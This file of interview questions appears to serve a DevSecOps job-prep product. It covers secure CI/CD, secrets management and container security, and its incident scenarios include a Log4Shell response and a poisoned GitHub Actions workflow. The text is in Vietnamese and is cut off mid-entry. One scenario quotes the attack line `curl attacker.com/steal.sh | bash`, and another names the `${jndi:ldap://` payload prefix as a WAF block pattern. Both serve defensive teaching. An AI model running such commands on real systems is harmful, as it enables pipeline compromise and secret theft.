const { q, SRC } = require('./fe_data.cjs');

const GRC_SRC = {
  nist_csf: "https://www.nist.gov/cyberframework",
  iso27001: "https://www.iso.org/standard/27001",
  nist_rmf: "https://csrc.nist.gov/projects/risk-management/about-rmf",
  gdpr: "https://gdpr-info.eu/",
  pci_dss: "https://www.pcisecuritystandards.org/",
  internal: "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
};

// ==========================================
// 1. DEVSECOPS ENGINEER
// ==========================================
const devSecOpsQuestions = [
  // Foundation (6)
  q("DEVSECOPS-FOUND-01", "DevSecOps Engineer", "foundation", "intermediate", "junior",
    "Triết lý 'Shift Left Security' và vai trò cốt lõi của DevSecOps: Tại sao việc tích hợp an ninh sớm nhất vào quy trình phát triển phần mềm (từ giai đoạn thiết kế) lại tiết kiệm chi phí hơn gấp 100 lần so với phát hiện lỗ hổng trên Production?",
    ["Shift Left: Dịch chuyển các hoạt động kiểm thử bảo mật sang trái trên trục thời gian SDLC (từ Production -> QA -> Build -> Code -> Design)", "Chi phí sửa lỗi tăng theo cấp số nhân: Lỗi phát hiện lúc thiết kế chỉ mất vài giờ sửa; cùng lỗi đó phát hiện trên Production có thể mất hàng tuần để vá, rollback, và xử lý sự cố", "DevSecOps = DevOps + Security: Bổ sung các cổng bảo mật (Security Gates) tự động vào từng giai đoạn CI/CD mà không làm chậm tốc độ giao hàng"],
    ["Khác biệt giữa 'Shift Left' (phát hiện sớm) và 'Shift Right' (giám sát an ninh trên Production)?", "Tại sao DevSecOps không chỉ là việc cài thêm công cụ quét mà là thay đổi văn hóa toàn tổ chức?"],
    ["Shift Left Security", "DevSecOps Culture", "SDLC Security", "Security Gates", "Cost of Defects"],
    [GRC_SRC.internal],
    ["Cho rằng DevSecOps chỉ là cài thêm một plugin quét bảo mật vào Jenkins là xong"]
  ),
  q("DEVSECOPS-FOUND-02", "DevSecOps Engineer", "foundation", "advanced", "middle",
    "Kiến trúc Pipeline CI/CD An toàn (Secure CI/CD Pipeline Architecture): Các mối đe dọa nhắm vào hệ thống CI/CD (Poisoned Pipeline Execution, Dependency Confusion, Secrets in Code) và biện pháp phòng thủ chiều sâu?",
    ["Poisoned Pipeline Execution (PPE): Kẻ tấn công chỉnh sửa file pipeline definition (`.github/workflows/*.yml`, `Jenkinsfile`) trong Pull Request để inject mã độc chạy với quyền hạn cao của CI/CD runner", "Phòng thủ: Tách biệt pipeline definition (chỉ admin merge), dùng Reusable Workflows / Shared Libraries được quản lý tập trung; chạy CI trên Runner cô lập (Ephemeral runners) bị hủy sau mỗi build", "Kiểm soát bí mật: Không lưu secrets trong code hay biến môi trường CI; sử dụng Vault / OIDC Token Federation để cấp quyền truy cập đám mây ngắn hạn (Short-lived credentials) cho pipeline"],
    ["OWASP Top 10 CI/CD Security Risks liệt kê những nguy cơ nghiêm trọng nào?", "Cách phát hiện và ngăn chặn một contributor bên ngoài inject mã độc vào GitHub Actions workflow?"],
    ["Secure CI/CD", "Poisoned Pipeline", "Ephemeral Runners", "OIDC Federation", "Pipeline Hardening"],
    ["https://owasp.org/www-project-top-10-ci-cd-security-risks/", GRC_SRC.internal],
    ["Cho phép bất kỳ Pull Request nào cũng tự động kích hoạt pipeline với quyền admin mà không cần review"]
  ),
  q("DEVSECOPS-FOUND-03", "DevSecOps Engineer", "foundation", "advanced", "middle",
    "Bảo mật Container và Container Image Hardening: Các nguyên tắc xây dựng Docker Image tối giản an toàn (Distroless / Scratch base images), quét lỗ hổng image (Trivy, Grype) và thực thi chính sách OPA/Gatekeeper trên Kubernetes?",
    ["Base Image tối giản: Sử dụng Google Distroless hoặc Alpine với multi-stage build để giảm bề mặt tấn công xuống mức tối thiểu; tuyệt đối không dùng base image `latest` tag", "Quét lỗ hổng: Tích hợp Trivy hoặc Grype vào CI để quét CVE trong các lớp image trước khi push lên Registry; thiết lập ngưỡng chặn (vd: block push nếu có CVE Critical/High chưa có bản vá)", "OPA Gatekeeper trên Kubernetes: Thực thi chính sách buộc mọi container phải chạy với user non-root (`runAsNonRoot: true`), cấm mount volume nhạy cảm (`/var/run/docker.sock`), và cấm chạy chế độ đặc quyền (`privileged: false`)"],
    ["Rootless container vs Rootless Podman: Tại sao việc chạy container hoàn toàn không cần quyền root lại an toàn hơn nhiều?", "Cách thiết lập Admission Controller trong Kubernetes để từ chối triển khai các image chưa được ký số?"],
    ["Container Security", "Distroless Images", "Trivy CVE Scanning", "OPA Gatekeeper", "Non-root Containers"],
    ["https://kubernetes.io/docs/concepts/security/", GRC_SRC.internal],
    ["Chạy toàn bộ container bằng quyền root và mount `docker.sock` vào container ứng dụng"]
  ),
  q("DEVSECOPS-FOUND-04", "DevSecOps Engineer", "foundation", "advanced", "senior_lead",
    "Nguyên lý Hạ tầng bất biến (Immutable Infrastructure) và Hạ tầng dưới dạng mã (Infrastructure as Code - IaC Security): Cách áp dụng GitOps (ArgoCD/Flux) kết hợp với Policy-as-Code (Checkov, tfsec, OPA/Rego) để đảm bảo mọi thay đổi hạ tầng đều được kiểm soát bảo mật?",
    ["Immutable Infrastructure: Không bao giờ SSH vào server để sửa đổi thủ công; mọi thay đổi đều phải đi qua Git commit -> CI/CD pipeline -> triển khai bản mới hoàn toàn (thay thế, không vá)", "GitOps: ArgoCD hoặc Flux theo dõi một Git repository chứa manifests Kubernetes; mọi thay đổi cấu hình phải được Pull Request review, phê duyệt và merge; ArgoCD tự động đồng bộ trạng thái mong muốn", "Policy-as-Code: Chạy Checkov/tfsec trong CI quét file Terraform/CloudFormation trước khi áp dụng; OPA Rego policies kiểm tra tuân thủ nghiêm ngặt (vd: cấm tạo S3 bucket không mã hóa, cấm tạo EC2 trong Public Subnet)"],
    ["Configuration Drift xảy ra khi nào và Immutable Infrastructure giải quyết triệt để vấn đề này như thế nào?", "Cách quản lý Terraform State file an toàn (S3 backend + DynamoDB locking + KMS encryption)?"],
    ["Immutable Infrastructure", "GitOps", "ArgoCD", "Policy-as-Code", "Checkov", "Configuration Drift"],
    ["https://www.checkov.io/", GRC_SRC.internal],
    ["SSH trực tiếp vào máy chủ Production để sửa cấu hình thủ công mà không ghi nhận vào Git"]
  ),
  q("DEVSECOPS-FOUND-05", "DevSecOps Engineer", "foundation", "intermediate", "junior",
    "Quản lý Bí mật trong DevOps (Secrets Management): Phân biệt các giải pháp HashiCorp Vault, AWS Secrets Manager, SOPS (Mozilla) và Sealed Secrets (Bitnami) cho Kubernetes?",
    ["HashiCorp Vault: Giải pháp toàn diện nhất; cung cấp Dynamic Secrets (tạo mật khẩu DB tạm thời có thời hạn), PKI engine tự cấp chứng chỉ TLS, và Transit engine mã hóa dữ liệu ứng dụng", "AWS Secrets Manager: Tích hợp sâu với AWS; tự động xoay vòng mật khẩu RDS/Redshift qua Lambda; truy xuất bằng AWS SDK trong code ứng dụng", "SOPS + Age/KMS: Mã hóa chỉ phần giá trị (value) trong file YAML/JSON cấu hình, giữ nguyên key để vẫn đọc được cấu trúc file trong Git diff; giải mã tự động trong pipeline CI/CD", "Sealed Secrets: Bitnami controller chạy trong Kubernetes cluster; mã hóa secret bằng public key, chỉ có controller trong cluster mới giải mã được; cho phép lưu trữ SealedSecret resource an toàn trong Git"],
    ["Tại sao không bao giờ được commit file `.env` chứa secrets vào Git repository dù là private?", "Dynamic Secrets của Vault khác gì so với Static Secrets truyền thống?"],
    ["Secrets Management", "HashiCorp Vault", "SOPS", "Sealed Secrets", "Dynamic Secrets", "Secret Rotation"],
    ["https://developer.hashicorp.com/vault/docs", GRC_SRC.internal],
    ["Lưu mật khẩu database và API keys dưới dạng plaintext trong file `docker-compose.yml` trên Git"]
  ),
  q("DEVSECOPS-FOUND-06", "DevSecOps Engineer", "foundation", "advanced", "middle",
    "Bảo mật Chuỗi cung ứng Phần mềm (Software Supply Chain Security): Tiêu chuẩn SLSA (Supply-chain Levels for Software Artifacts), SBOM (Software Bill of Materials) và ký số Artifact (Sigstore/Cosign)?",
    ["SLSA Framework: Bốn cấp độ trưởng thành (Level 1-4) đo lường mức độ bảo vệ quy trình xây dựng phần mềm từ nguồn mã đến artifact cuối cùng; Level 3 yêu cầu build trên hệ thống cô lập không thể can thiệp và tạo Provenance metadata (chứng nhận xuất xứ)", "SBOM: Tạo danh mục thành phần phần mềm (theo CycloneDX/SPDX) tại mỗi bước build; sử dụng để theo dõi liên tục các CVE mới xuất hiện trong thư viện bên thứ ba đã dùng", "Sigstore/Cosign: Ký số container image bằng chứng chỉ tạm thời (Keyless signing qua OIDC); Rekor Transparency Log ghi lại mọi lần ký để có thể kiểm chứng sau này"],
    ["Vụ tấn công SolarWinds SUNBURST là ví dụ kinh điển về Supply Chain Attack như thế nào?", "SLSA Level 4 yêu cầu 'Hermetic build' là gì và tại sao nó quan trọng?"],
    ["SLSA", "SBOM", "Sigstore", "Cosign", "Supply Chain Integrity", "Build Provenance"],
    ["https://slsa.dev/", GRC_SRC.internal],
    ["Không quan tâm đến nguồn gốc và tính toàn vẹn của các thư viện mã nguồn mở tải về từ Internet"]
  ),

  // Practical Skills (8)
  q("DEVSECOPS-PRAC-01", "DevSecOps Engineer", "practical_skills", "advanced", "middle",
    "Thiết kế Pipeline CI/CD hoàn chỉnh với các Security Gates tự động: Cách tích hợp Pre-commit hooks (detect-secrets, gitguardian), SAST (Semgrep), SCA (Trivy/Snyk), DAST (OWASP ZAP) và Container Image Scanning vào một luồng CI/CD thực tế?",
    ["Pre-commit: Chạy `detect-secrets` hoặc GitLeaks trên local trước khi commit để ngăn secrets lọt vào Git", "Build stage: SAST incremental (Semgrep) chỉ quét file thay đổi trong PR; SCA (Trivy) quét dependency lockfile; Container image scan sau `docker build`", "Deploy to Staging: DAST (OWASP ZAP baseline scan) tự động chạy trên môi trường test; kết quả gom vào DefectDojo hoặc dashboard tập trung", "Gate Policy: Chỉ break build cho Critical/High mới phát sinh (không áp dụng cho legacy technical debt đã ghi nhận); các finding khác tạo ticket Jira tự động với SLA sửa lỗi"],
    ["Làm thế nào để giữ tổng thời gian pipeline dưới 10 phút mà vẫn đảm bảo quét đầy đủ?", "Cách xử lý khi một CVE Critical bùng nổ trên thư viện core mà chưa có bản vá (Zero-day in dependency)?"],
    ["Security Pipeline", "Pre-commit Hooks", "SAST DAST SCA", "DefectDojo", "Gate Policy", "Build Time Budget"],
    ["https://owasp.org/www-project-devsecops-guideline/", GRC_SRC.internal],
    ["Chạy full SAST scan trên toàn bộ codebase 500K dòng mỗi lần commit làm pipeline mất 45 phút"]
  ),
  q("DEVSECOPS-PRAC-02", "DevSecOps Engineer", "practical_skills", "advanced", "senior_lead",
    "Xây dựng Golden Pipeline Templates và Shared CI/CD Libraries: Cách tạo các template pipeline chuẩn hóa an ninh (GitHub Reusable Workflows / GitLab CI includes / Jenkins Shared Libraries) để mọi dự án trong tổ chức tự động kế thừa các bước kiểm tra bảo mật mặc định?",
    ["Golden Templates: Tạo một repository trung tâm chứa các workflow/pipeline templates đã được hardened với đầy đủ security steps; các dự án chỉ cần `uses: org/security-pipeline/.github/workflows/scan.yml@v2`", "Versioning & Rollout: Đánh phiên bản (Semantic Versioning) cho templates; triển khai dần (Canary rollout) phiên bản mới trên vài dự án pilot trước khi áp dụng toàn bộ tổ chức", "Tùy biến có kiểm soát: Cho phép các dự án override một số tham số (vd: ngưỡng chặn severity, loại trừ test paths) nhưng không cho phép tắt hoàn toàn các security steps bắt buộc"],
    ["Lợi ích của việc quản lý tập trung so với việc mỗi đội tự cài đặt pipeline riêng?", "Cách đo lường tỷ lệ áp dụng (Adoption Rate) của Golden Templates trên toàn bộ tổ chức?"],
    ["Golden Pipeline", "Reusable Workflows", "Shared Libraries", "Standardization", "Canary Rollout"],
    [GRC_SRC.internal],
    ["Cho phép mỗi đội tự do cấu hình pipeline riêng dẫn đến 80% dự án không có bất kỳ bước quét bảo mật nào"]
  ),
  q("DEVSECOPS-PRAC-03", "DevSecOps Engineer", "practical_skills", "advanced", "middle",
    "Bảo mật Runtime Container và Kubernetes (Runtime Protection): Triển khai Falco hoặc Tetragon để giám sát và phát hiện hành vi bất thường (Anomaly Detection) của container trên Production?",
    ["Falco: Giám sát system calls (syscalls) của container dựa trên các luật phát hiện (Falco Rules); cảnh báo khi phát hiện hành vi bất thường (vd: container chạy shell `bash`, đọc file `/etc/shadow`, kết nối mạng ra ngoài từ container không nên có Internet)", "Tetragon (Cilium): Giám sát syscalls ở tầng eBPF trong kernel; hiệu năng cao hơn do xử lý trực tiếp trong kernel space mà không cần chuyển dữ liệu lên user space", "Tích hợp với SOC: Gửi cảnh báo Falco qua Kafka/Fluentd vào SIEM (Splunk/Sentinel) để đội SOC theo dõi; thiết lập NetworkPolicy Kubernetes cô lập tự động pod bất thường"],
    ["Khác biệt giữa giám sát dựa trên luật (Rule-based) và giám sát dựa trên profile hành vi (Behavioral Profiling)?", "Làm thế nào để xây dựng Falco rules tùy biến cho các ứng dụng đặc thù của công ty?"],
    ["Falco", "Tetragon", "eBPF Security", "Runtime Protection", "Syscall Monitoring", "Container Anomaly"],
    ["https://falco.org/docs/", GRC_SRC.internal],
    ["Triển khai container lên Production mà không có bất kỳ cơ chế giám sát runtime nào"]
  ),
  q("DEVSECOPS-PRAC-04", "DevSecOps Engineer", "practical_skills", "advanced", "middle",
    "Quản lý chứng chỉ TLS tự động (Automated Certificate Management): Triển khai cert-manager trên Kubernetes với Let's Encrypt / AWS ACM và cấu hình mTLS giữa các dịch vụ nội bộ qua Service Mesh (Istio/Linkerd)?",
    ["cert-manager: Tự động yêu cầu, gia hạn và cài đặt chứng chỉ TLS từ Let's Encrypt qua ACME protocol; hỗ trợ HTTP-01 và DNS-01 challenge", "AWS ACM: Cấp chứng chỉ miễn phí cho các dịch vụ AWS (ALB, CloudFront, API Gateway) với tự động gia hạn; tuy nhiên không cho phép xuất private key", "mTLS trong Service Mesh: Istio/Linkerd tự động cấp chứng chỉ SPIFFE cho mỗi pod qua Citadel/Identity; xoay vòng chứng chỉ trong suốt (transparent rotation) mà ứng dụng không cần thay đổi code"],
    ["Rủi ro nghiêm trọng khi chứng chỉ TLS hết hạn trên Production và cách phòng tránh?", "Tại sao Wildcard certificate (`*.company.com`) lại kém an toàn hơn so với chứng chỉ riêng biệt cho từng subdomain?"],
    ["cert-manager", "Let's Encrypt", "mTLS", "SPIFFE Certificates", "Certificate Rotation", "AWS ACM"],
    ["https://cert-manager.io/docs/", GRC_SRC.internal],
    ["Quản lý chứng chỉ TLS thủ công trên bảng tính Excel và quên gia hạn làm sập toàn bộ website"]
  ),
  q("DEVSECOPS-PRAC-05", "DevSecOps Engineer", "practical_skills", "advanced", "middle",
    "Xây dựng hệ thống giám sát an ninh tập trung cho DevSecOps (Security Observability): Cách thiết kế dashboard tổng hợp số liệu bảo mật từ nhiều nguồn (SAST, SCA, DAST, Container Scan, Cloud CSPM) vào một bảng điều khiển duy nhất?",
    ["Nền tảng tổng hợp: Sử dụng DefectDojo hoặc Grafana Security Dashboard để gom nhận kết quả từ các công cụ khác nhau qua API import", "Chỉ số cốt lõi (Key Security Metrics): Tổng số lỗ hổng theo mức độ nghiêm trọng (Critical/High/Medium/Low), Mean Time to Remediate (MTTR), Tỷ lệ SLA tuân thủ (% lỗi vá trong hạn), Số lượng secrets lộ lọt bắt được trước khi merge", "Cảnh báo thông minh: Thiết lập ngưỡng báo động khi số lỗi Critical mới vượt ngưỡng hàng ngày hoặc khi có container image chạy trên Production chứa CVE Critical chưa vá quá 7 ngày"],
    ["Tại sao việc có một 'Single Pane of Glass' cho bảo mật lại giúp CISO đưa ra quyết định nhanh hơn?", "Cách sử dụng các chỉ số DORA (Deployment Frequency, Lead Time, MTTR, Change Failure Rate) kết hợp với Security Metrics?"],
    ["Security Observability", "DefectDojo", "MTTR", "Security Metrics", "DORA Metrics", "Grafana Dashboard"],
    [GRC_SRC.internal],
    ["Mỗi công cụ bảo mật có một dashboard riêng biệt mà không ai tổng hợp, dẫn đến không ai có bức tranh toàn cảnh"]
  ),
  q("DEVSECOPS-PRAC-06", "DevSecOps Engineer", "practical_skills", "advanced", "senior_lead",
    "Thiết kế hệ thống Quản lý Lỗ hổng Tập trung (Vulnerability Management Program) cho tổ chức DevSecOps: Cách phân loại, gán nhãn ưu tiên (Risk-based Prioritization) và theo dõi SLA sửa lỗi giữa các đội phát triển?",
    ["Phân loại dựa trên rủi ro thực tế: Không chỉ dựa vào CVSS score; kết hợp các yếu tố: Lỗ hổng có đang bị khai thác ngoài tự nhiên không (EPSS score), tài sản bị ảnh hưởng có tiếp xúc Internet không, dữ liệu nhạy cảm nào bị đe dọa", "SLA Remediation: Critical (vá trong 24-48 giờ), High (7 ngày), Medium (30 ngày), Low (90 ngày); theo dõi tỷ lệ tuân thủ SLA theo từng đội và báo cáo hàng tuần", "Exception Management: Quy trình chấp nhận rủi ro có hạn (Risk Acceptance với thời hạn expiry) cho các trường hợp không thể vá ngay; bắt buộc có ký duyệt của Tech Lead và Security"],
    ["Tại sao EPSS (Exploit Prediction Scoring System) lại là bước tiến quan trọng so với chỉ dùng CVSS đơn thuần?", "Cách xử lý 'Alert Fatigue' khi SCA liên tục báo hàng trăm CVE nhưng hầu hết không khả dụng trong ngữ cảnh ứng dụng?"],
    ["Vulnerability Management", "Risk-based Prioritization", "EPSS", "SLA Tracking", "Exception Management"],
    ["https://www.first.org/epss/", GRC_SRC.internal],
    ["Gửi danh sách 500 CVE cho đội dev yêu cầu sửa hết mà không phân loại ưu tiên theo rủi ro thực tế"]
  ),
  q("DEVSECOPS-PRAC-07", "DevSecOps Engineer", "practical_skills", "advanced", "middle",
    "Tự động hóa phản ứng bảo mật trong CI/CD (Automated Security Response): Cách thiết kế hệ thống tự động chặn triển khai (Deployment Blocking) khi phát hiện lỗ hổng nghiêm trọng và tự động rollback khi phát hiện bất thường trên Production?",
    ["Admission Controller: Triển khai OPA Gatekeeper hoặc Kyverno làm Admission Webhook trên Kubernetes; từ chối triển khai bất kỳ image nào chưa qua quét hoặc chứa CVE Critical", "Automated Rollback: Kết hợp Canary Deployment (Argo Rollouts / Flagger) với các metrics an ninh; nếu rate of 4xx/5xx tăng đột biến hoặc Falco phát hiện hành vi bất thường từ phiên bản mới -> tự động rollback về phiên bản ổn định trước đó", "Break Glass Procedure: Cung cấp quy trình khẩn cấp cho phép deploy bỏ qua security gates trong tình huống cần hotfix gấp, nhưng bắt buộc có sự phê duyệt của Security Lead và ghi log chi tiết"],
    ["Rủi ro khi tự động hóa quá mức (Over-automation) trong phản ứng bảo mật?", "Thiết kế Break Glass sao cho vẫn đảm bảo trách nhiệm giải trình (Accountability)?"],
    ["Admission Controller", "Automated Rollback", "Canary Deployment", "Break Glass", "Argo Rollouts"],
    [GRC_SRC.internal],
    ["Không có cơ chế Break Glass khẩn cấp khiến đội dev bất lực khi cần deploy hotfix lúc 2 giờ sáng"]
  ),
  q("DEVSECOPS-PRAC-08", "DevSecOps Engineer", "practical_skills", "advanced", "senior_lead",
    "Xây dựng Chương trình Đào tạo và Văn hóa DevSecOps (Security Culture Program): Cách triển khai Security Champions Network, Secure Coding Tournaments và Threat Modeling sprints trong các đội Agile?",
    ["Security Champions: Lựa chọn 1-2 kỹ sư/đội được đào tạo chuyên sâu về bảo mật; họ thực hiện security review PR, dẫn dắt threat modeling và là đầu mối liên lạc với đội AppSec trung tâm", "Gamification: Tổ chức CTF (Capture The Flag) nội bộ, giải đấu Secure Coding trên Secure Code Warrior hoặc Snyk Learn; trao giải thưởng và ghi nhận thành tích", "Threat Modeling as Sprint Activity: Đưa buổi threat modeling ngắn (30 phút) vào Sprint Planning hoặc Sprint 0 cho mỗi Epic/Feature mới; sử dụng STRIDE Methodology trên Whiteboard"],
    ["Làm thế nào để đo lường sự thay đổi văn hóa bảo mật (Security Culture Maturity) trong tổ chức?", "Cách duy trì động lực cho Security Champions khi họ phải gánh thêm trách nhiệm?"],
    ["Security Champions", "DevSecOps Culture", "CTF Training", "Threat Modeling Sprints", "Gamification"],
    [GRC_SRC.internal],
    ["Áp đặt bảo mật từ trên xuống bằng mệnh lệnh mà không xây dựng sự đồng thuận và hứng thú từ dev"]
  ),

  // Scenario (6)
  q("DEVSECOPS-SCEN-01", "DevSecOps Engineer", "scenario", "advanced", "middle",
    "Tình huống: Sau khi tích hợp công cụ SAST vào pipeline CI/CD, đội phát triển gồm 50 lập trình viên đang nổi giận vì thời gian build tăng thêm 20 phút và tỷ lệ false positive lên tới 70%, khiến họ không thể merge code đúng hạn. Sếp trực tiếp của đội dev yêu cầu tắt ngay lập tức SAST khỏi pipeline. Em giải quyết cuộc khủng hoảng này ra sao?",
    ["Lắng nghe và thừa nhận vấn đề: Công cụ SAST chưa được tinh chỉnh gây phiền hà chính đáng cho lập trình viên", "Giải pháp kỹ thuật tức thời: Chuyển SAST sang chế độ incremental scan (chỉ quét file thay đổi trong PR giảm thời gian từ 20 phút xuống 2-3 phút); Tắt các rule có tỷ lệ false positive cao, chỉ giữ lại các rule phát hiện lỗi Critical chính xác", "Giải pháp quy trình: Chuyển sang chế độ Advisory (không block merge) trong 2 tuần đầu; cùng Tech Lead ngồi lại review từng finding, baseline các false positive đã biết; sau đó mới bật lại chế độ Blocking chỉ cho các rule đã được kiểm chứng độ chính xác cao"],
    ["Chỉ số gì đo lường hiệu quả của việc tinh chỉnh SAST (Signal-to-Noise Ratio)?", "Cách tổ chức 'Bug Bash' để dev và security cùng ngồi phân loại findings?"],
    ["SAST Tuning", "Developer Friction", "Incremental Scanning", "Signal-to-Noise Ratio", "Stakeholder Management"],
    [GRC_SRC.internal],
    ["Bỏ cuộc tắt SAST vĩnh viễn hoặc ngược lại ép buộc dev chịu đựng 70% false positive"]
  ),
  q("DEVSECOPS-SCEN-02", "DevSecOps Engineer", "scenario", "advanced", "senior_lead",
    "Tình huống: Vào 23:00 tối thứ Sáu, hệ thống Snyk SCA gửi cảnh báo khẩn cấp: Thư viện `log4j-core` phiên bản 2.14.1 đang được sử dụng trong 15 microservices trên Production có lỗ hổng RCE Critical (Log4Shell CVE-2021-44228). Kẻ tấn công đã bắt đầu khai thác tràn lan trên toàn thế giới. Em triển khai kế hoạch khắc phục khẩn cấp quy mô toàn doanh nghiệp như thế nào?",
    ["Phút 0-30: Áp dụng WAF virtual patch chặn các payload `${jndi:ldap://` trên toàn bộ entry points; thiết lập outbound firewall rule chặn kết nối LDAP/RMI ra ngoài từ các server ứng dụng", "30 phút - 2 giờ: Sử dụng SBOM đã có sẵn hoặc chạy Trivy/Syft toàn bộ container registry để định danh chính xác 15 service nào đang dùng phiên bản lỗi; nâng cấp log4j lên phiên bản 2.17.1+ và rebuild image", "2 giờ - 4 giờ: Triển khai rolling update từng service với canary deployment; giám sát chặt chẽ lỗi và performance sau mỗi bản nâng cấp; kiểm tra log xem có dấu hiệu khai thác thành công trước khi vá không"],
    ["Tại sao việc có sẵn SBOM giúp tiết kiệm hàng giờ quý giá trong tình huống Zero-day khẩn cấp?", "Cách xử lý khi một trong 15 services không thể nâng cấp log4j ngay vì phụ thuộc vào framework cũ không tương thích?"],
    ["Zero-Day Emergency", "Log4Shell Response", "WAF Virtual Patch", "SBOM Triage", "Rolling Update"],
    [GRC_SRC.internal],
    ["Chờ đến thứ Hai tuần sau mới xử lý vì cuối tuần không có lịch bảo trì"]
  ),
  q("DEVSECOPS-SCEN-03", "DevSecOps Engineer", "scenario", "advanced", "middle",
    "Tình huống: Đội DevOps phát hiện một GitHub Actions workflow trong repository nội bộ đã bị kẻ tấn công chỉnh sửa (qua Pull Request từ một tài khoản nhân viên bị chiếm đoạt) để thêm bước `curl attacker.com/steal.sh | bash` chạy với GITHUB_TOKEN có quyền ghi (write). Em điều tra phạm vi ảnh hưởng và khắc phục như thế nào?",
    ["Bước 1: Vô hiệu hóa ngay lập tức GITHUB_TOKEN bị lạm dụng; kiểm tra Git commit history và audit log để xác định thời điểm chính xác workflow bị chỉnh sửa", "Bước 2: Kiểm tra toàn bộ các secrets có thể đã bị trích xuất trong quá trình CI chạy (AWS keys, NPM tokens, database credentials); thu hồi và xoay vòng tất cả", "Bước 3: Kiểm tra xem script `steal.sh` đã thực hiện hành vi gì (đọc biến môi trường, tải repository nội bộ, gửi dữ liệu ra ngoài)", "Bước 4: Áp dụng biện pháp phòng ngừa: Yêu cầu Code Review bắt buộc cho mọi thay đổi workflow files; giới hạn quyền GITHUB_TOKEN mặc định sang read-only; bật Branch Protection Rules"],
    ["Tại sao GITHUB_TOKEN mặc định trong GitHub Actions có thể trở thành vũ khí nguy hiểm nếu không giới hạn quyền?", "Cách thiết lập CODEOWNERS file để bảo vệ `.github/workflows/` directory?"],
    ["CI/CD Pipeline Attack", "GitHub Actions Compromise", "Token Revocation", "Workflow Protection", "CODEOWNERS"],
    [GRC_SRC.internal],
    ["Chỉ xóa commit độc hại mà không kiểm tra các secrets đã bị rò rỉ trong quá trình pipeline chạy"]
  ),
  q("DEVSECOPS-SCEN-04", "DevSecOps Engineer", "scenario", "advanced", "middle",
    "Tình huống: Công ty quyết định chuyển từ mô hình triển khai máy ảo truyền thống sang kiến trúc Microservices chạy trên Kubernetes. Đội bảo mật chưa có kinh nghiệm với container và Kubernetes. Là DevSecOps Lead, em xây dựng lộ trình bảo mật cho quá trình chuyển đổi này như thế nào?",
    ["Giai đoạn 1 (Tháng 1-2): Thiết lập nền tảng (Foundation): Xây dựng Hardened Base Images, tích hợp Trivy vào CI/CD, thiết lập Private Container Registry với vulnerability scanning tự động", "Giai đoạn 2 (Tháng 3-4): Kiểm soát truy cập (Access Control): Triển khai Kubernetes RBAC, Network Policies (Default Deny), Pod Security Standards (Restricted profile)", "Giai đoạn 3 (Tháng 5-6): Giám sát runtime (Runtime Protection): Cài đặt Falco/Tetragon giám sát syscalls; triển khai Service Mesh (Istio) với mTLS; tích hợp cảnh báo vào SIEM", "Đào tạo xuyên suốt: Tổ chức workshop Kubernetes Security cho đội Dev và Ops mỗi 2 tuần"],
    ["Những sai lầm bảo mật phổ biến nhất khi chuyển từ VM sang Container/K8s?", "Cách đánh giá mức độ trưởng thành bảo mật Kubernetes (K8s Security Maturity Model)?"],
    ["K8s Migration Security", "Hardened Base Images", "Pod Security Standards", "RBAC", "Security Roadmap"],
    ["https://kubernetes.io/docs/concepts/security/", GRC_SRC.internal],
    ["Cho rằng Kubernetes tự động bảo mật sẵn và không cần cấu hình Network Policy hay RBAC"]
  ),
  q("DEVSECOPS-SCEN-05", "DevSecOps Engineer", "scenario", "advanced", "senior_lead",
    "Tình huống: Một cuộc kiểm toán SOC 2 Type II phát hiện rằng 40% các microservices đang chạy trên Production sử dụng container image cũ hơn 6 tháng với hàng chục CVE Critical chưa vá. Kiểm toán viên yêu cầu khắc phục toàn bộ trong vòng 30 ngày. Em lập kế hoạch hành động như thế nào?",
    ["Tuần 1: Kiểm kê toàn diện (Inventory): Sử dụng Trivy/Anchore quét toàn bộ container đang chạy; phân loại theo mức độ nghiêm trọng và tác động kinh doanh; ưu tiên các services tiếp xúc Internet", "Tuần 2-3: Nâng cấp hàng loạt (Batch Remediation): Rebuild image với base image mới nhất và cập nhật dependencies; triển khai qua canary deployment với giám sát; đội SRE và Dev phối hợp chặt chẽ", "Tuần 4: Xác minh và báo cáo: Quét lại toàn bộ xác nhận CVE Critical đã được vá; viết báo cáo remediation evidence cho kiểm toán viên", "Phòng ngừa tái phát: Thiết lập chính sách 'Image Freshness Policy' bắt buộc rebuild image tối thiểu 30 ngày/lần; cấu hình Admission Controller chặn triển khai image cũ hơn 90 ngày"],
    ["Tại sao việc rebuild image định kỳ (Base Image Refresh) lại quan trọng hơn việc chỉ vá từng CVE đơn lẻ?", "Cách thiết lập chính sách tự động phát hiện và cảnh báo container image lỗi thời (Image Age Alert)?"],
    ["SOC 2 Remediation", "Image Freshness", "Batch Vulnerability Fix", "Admission Controller Age Check", "Compliance Evidence"],
    [GRC_SRC.internal],
    ["Yêu cầu toàn bộ 40% services dừng hoạt động cùng lúc để nâng cấp gây gián đoạn dịch vụ nghiêm trọng"]
  ),
  q("DEVSECOPS-SCEN-06", "DevSecOps Engineer", "scenario", "advanced", "middle",
    "Tình huống: Một lập trình viên thực tập vô tình commit AWS Access Key và Secret Key vào một public GitHub repository. Công cụ GitGuardian phát hiện và gửi cảnh báo sau 3 phút. Access Key này gắn với một IAM User có quyền đọc/ghi vào S3 bucket chứa dữ liệu khách hàng. Hành động khẩn cấp của em là gì?",
    ["Phút 0-5: Lập tức vào AWS Console/CLI vô hiệu hóa Access Key ngay lập tức (Deactivate key rồi Delete key); không chờ xác nhận vì mỗi giây đều có thể bị tin tặc tự động quét GitHub và khai thác", "Phút 5-15: Kiểm tra CloudTrail logs của Access Key đó: Có bất kỳ API call bất thường nào từ IP lạ không (ListBuckets, GetObject, PutObject)? Xác định phạm vi dữ liệu bị ảnh hưởng", "Phút 15-30: Git history rewrite: Sử dụng `git filter-branch` hoặc BFG Repo Cleaner để xóa vĩnh viễn secret khỏi lịch sử Git; Force push lên remote", "Sau sự cố: Chuyển sang sử dụng IAM Roles với STS temporary credentials thay vì Access Keys tĩnh; bắt buộc Pre-commit hook `detect-secrets` cho toàn tổ chức"],
    ["Tại sao việc chỉ xóa commit chứa secret trên GitHub là KHÔNG ĐỦ vì Git history vẫn lưu giữ?", "Bao lâu thì bọn bot tự động trên Internet quét được secret mới được push lên GitHub public?"],
    ["Secret Leak Emergency", "CloudTrail Investigation", "Git History Rewrite", "BFG Repo Cleaner", "Pre-commit Hooks"],
    [GRC_SRC.internal],
    ["Chỉ xóa file chứa secret trong commit mới nhưng không rewrite Git history và không kiểm tra CloudTrail"]
  ),

  // CV Validation (5)
  q("DEVSECOPS-CV-01", "DevSecOps Engineer", "cv_validation", "advanced", "middle",
